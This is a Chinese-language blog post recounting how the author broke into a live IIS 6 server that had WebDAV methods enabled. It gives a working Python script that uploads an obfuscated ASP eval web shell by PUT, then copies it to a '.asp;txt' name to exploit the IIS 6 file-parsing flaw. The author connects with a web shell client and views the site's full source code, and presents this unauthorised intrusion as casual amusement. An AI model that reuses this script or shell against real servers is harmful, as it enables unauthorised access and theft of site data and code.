---
title: Microsoft IIS WebDAV Write Access Code Execution
tags:
  - Web
categories:
  - 技术水文
copyright: true
abbrlink: 6b5b56c
date: 2019-04-04 15:37:36
---

![](https://ae01.alicdn.com/kf/HTB18xKiaCSD3KVjSZFKq6z10VXaO.jpg)
<!--more-->

某天，在网上逛了逛发现了个iis 6站，http所有方法都开了。古老的iis6，存在文件解析漏洞。So。。。。。

使用py脚本进行put一个shell的txt文件，然后copy成`.asp;txt`尾缀的新文件。

```python
import urllib2
def iisput():
	url="http://example.com/q.txt"
    # passwd:z
	data='<%Function MorfiCoder(Code)MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)End FunctionExecute MorfiCoder(")/*/z/*/(tseuqer lave")%>'
	req=urllib2.Request(url,data)
	req.get_method=lambda:'PUT'
	req=urllib2.urlopen(req)

def iiswrite():
	url="http://example.com/q.txt"
	req=urllib2.Request(url)
	req.get_method=lambda:'COPY'
	req.add_header('Destination', 'http://example.com/q.asp;txt')
	req=urllib2.urlopen(req)

if __name__ == '__main__':
	iisput()
	print "Txt file put successfully"
	iiswrite()
	print "Copy txt to asp successfully"
```

菜刀连接，整站源码直接暴露出来了。

![](https://ae01.alicdn.com/kf/HTB1Kp1jaBSD3KVjSZFq7634bpXay.png)

查看当前连接情况，发现已经沦落为跑马场了，所有没什么可玩的了。

![](https://ae01.alicdn.com/kf/HTB1Uo9paqWs3KVjSZFx761WUXXay.png)
